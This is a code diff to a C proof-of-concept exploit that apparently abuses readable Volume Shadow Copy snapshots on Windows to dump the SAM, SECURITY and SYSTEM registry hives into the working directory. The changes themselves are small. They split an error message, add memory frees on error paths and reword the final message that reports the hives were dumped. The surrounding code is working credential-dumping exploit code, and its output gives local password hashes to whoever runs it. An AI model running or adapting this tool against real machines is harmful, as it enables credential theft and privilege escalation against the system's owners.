@@ -36,13 +36,16 @@ BOOL main() {
             hFile = CreateFileA(fullPathShadow, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
         }
         if (valideNumberVolume == NUMBER_SNAPSHOTS || hFile == INVALID_HANDLE_VALUE) {
-            printf("[x] Could not open %s :( Is System Protection not enabled or vulnerability fixed?  Note currently hardcoded to look for first %i VSS snapshots only - list snapshots with vssadmin list shadows\n", targetFiles[targetFilesNb], NUMBER_SNAPSHOTS);
+            printf("[x] Could not open %s :( Is System Protection not enabled or vulnerability fixed?\n", targetFiles[targetFilesNb]);
+            printf("[i] Note currently hardcoded to look for first %i VSS snapshots only - list snapshots with vssadmin list shadows\n", NUMBER_SNAPSHOTS);
+            free(fullPathShadow);
             return TRUE;
         }
 
         hAppend = CreateFileA(targetFiles[targetFilesNb], FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
         if (hAppend == INVALID_HANDLE_VALUE) {
             printf("[x] Could not write %s - permission issue rather than vulnerability issue, make sure you're running from a folder where you can write to\n", targetFiles[targetFilesNb]);
+            free(fullPathShadow);
             return TRUE;
         }
         while (ReadFile(hFile, buff, sizeof(buff), &dwBytesRead, NULL)
@@ -59,6 +62,6 @@ BOOL main() {
         valideNumberVolume--;
     }
     free(fullPathShadow);
-    printf("\n[*] Assuming no errors, should be able to find hive dump files in current working directory as SAM, SECURITY and SYSTEM\n");
+    printf("\n[*] Done, you should be able to find hive dump files in current working directory as SAM, SECURITY and SYSTEM\n");
     return FALSE;
 }
